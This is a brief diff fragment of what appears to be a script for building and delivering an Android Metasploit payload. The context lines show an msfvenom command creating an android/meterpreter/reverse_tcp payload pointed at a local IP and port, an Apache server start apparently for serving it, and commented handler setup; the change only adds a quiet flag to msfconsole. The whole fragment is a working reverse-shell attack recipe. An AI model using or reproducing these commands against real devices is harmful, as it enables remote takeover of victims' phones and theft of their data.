@@ -23,7 +23,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=5555 R > /
 service apache2 start 
 #service apache2 status
 
-#msfconsole
+#msfconsole -q
 
 #use exploit/multi/handler
 #set payload android/meterpreter/reverse_tcp
